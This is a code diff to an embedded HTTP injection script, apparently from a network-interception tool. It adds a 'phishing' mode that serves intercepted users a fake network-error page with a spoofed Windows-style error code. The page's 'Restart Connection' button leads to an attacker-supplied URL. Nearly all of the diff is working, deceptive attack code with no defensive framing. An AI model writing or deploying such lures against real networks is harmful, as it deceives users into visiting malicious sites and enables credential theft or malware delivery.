@@ -1969,8 +1969,8 @@ _HTTP_INJECT_SCRIPT = r'''
 import sys
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
-mode   = sys.argv[1]   # "redirect" | "page" | "rickroll"
-target = sys.argv[2]   # redirect URL (ignored for "page")
+mode   = sys.argv[1]   # "redirect" | "page" | "rickroll" | "phishing"
+target = sys.argv[2]   # redirect URL (for redirect/rickroll/phishing)
 port   = int(sys.argv[3])
 
 PWNED_HTML = b"""<!DOCTYPE html>
@@ -2011,6 +2011,42 @@ Contact your network administrator for remediation.</p>
 </body>
 </html>"""
 
+PHISHING_HTML_TEMPLATE = """<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Unexpected Error</title>
+<style>
+*{{margin:0;padding:0;box-sizing:border-box}}
+body{{background:#f3f3f3;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
+     display:flex;align-items:center;justify-content:center;min-height:100vh}}
+.box{{background:#fff;border:1px solid #d0d0d0;border-radius:4px;padding:2.5rem 2rem;
+      max-width:480px;width:90%;text-align:center;box-shadow:0 2px 8px rgba(0,0,0,.08)}}
+.icon{{font-size:3rem;margin-bottom:1rem}}
+h1{{font-size:1.15rem;font-weight:600;color:#1a1a1a;margin-bottom:.75rem}}
+p{{font-size:.9rem;color:#555;line-height:1.6;margin-bottom:1.25rem}}
+.code{{font-family:monospace;font-size:.8rem;background:#f7f7f7;border:1px solid #e0e0e0;
+       border-radius:3px;padding:.4rem .8rem;color:#888;margin-bottom:1.5rem;display:inline-block}}
+.btn{{display:inline-block;background:#0078d4;color:#fff;font-size:.9rem;font-weight:500;
+      padding:.65rem 2rem;border-radius:3px;text-decoration:none;cursor:pointer}}
+.btn:hover{{background:#006cbe}}
+.footer{{margin-top:1.5rem;font-size:.75rem;color:#aaa}}
+</style>
+</head>
+<body>
+<div class="box">
+  <div class="icon">&#x26A0;&#xFE0F;</div>
+  <h1>An unexpected error has occurred</h1>
+  <p>Your session has been interrupted due to a network configuration issue.<br>
+     Please restart your connection to continue.</p>
+  <div class="code">ERR_NETWORK_CHANGED&nbsp;&nbsp;0x80070035</div>
+  <a class="btn" href="{url}">Restart Connection</a>
+  <div class="footer">If this problem persists, contact your network administrator.</div>
+</div>
+</body>
+</html>"""
+
 intercepted = []
 
 class H(BaseHTTPRequestHandler):
@@ -2026,6 +2062,13 @@ class H(BaseHTTPRequestHandler):
             self.send_header("Location", url)
             self.send_header("Content-Length", "0")
             self.end_headers()
+        elif mode == "phishing":
+            body = PHISHING_HTML_TEMPLATE.format(url=target).encode("utf-8")
+            self.send_response(200)
+            self.send_header("Content-Type", "text/html; charset=utf-8")
+            self.send_header("Content-Length", str(len(body)))
+            self.end_headers()
+            self.wfile.write(body)
         else:  # "page"
             self.send_response(200)
             self.send_header("Content-Type", "text/html; charset=utf-8")
